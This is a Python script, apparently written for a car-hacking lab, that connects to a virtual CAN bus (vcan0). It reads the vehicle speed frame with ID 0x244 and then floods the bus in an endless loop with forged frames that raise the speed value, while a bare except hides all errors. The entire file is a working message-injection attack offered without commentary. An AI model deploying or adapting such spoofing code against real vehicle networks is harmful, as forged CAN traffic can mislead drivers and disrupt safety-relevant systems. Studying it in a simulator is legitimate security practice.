#!/usr/bin/python3
import can


CHANNEL = 'vcan0'
BUSTYPE = 'socketcan'

SPEED_ID = 0x244
ACCELERATION = 0x10


def accelerate() -> None:
    with can.Bus(channel=CHANNEL, bustype=BUSTYPE, can_filters=[{"can_id": SPEED_ID, "can_mask": 0Xfff, "extended": False}]) as bus:
        speed = bus.recv().data
        while True:
            bus.recv()
            bus.send(can.Message(arbitration_id=SPEED_ID, is_extended_id=False, data=speed))
            speed = (int.from_bytes(speed, 'big') + ACCELERATION).to_bytes(5, 'big')

def main() -> None:
    try:
        accelerate()
    except:
        pass


if __name__ == '__main__':
    main()
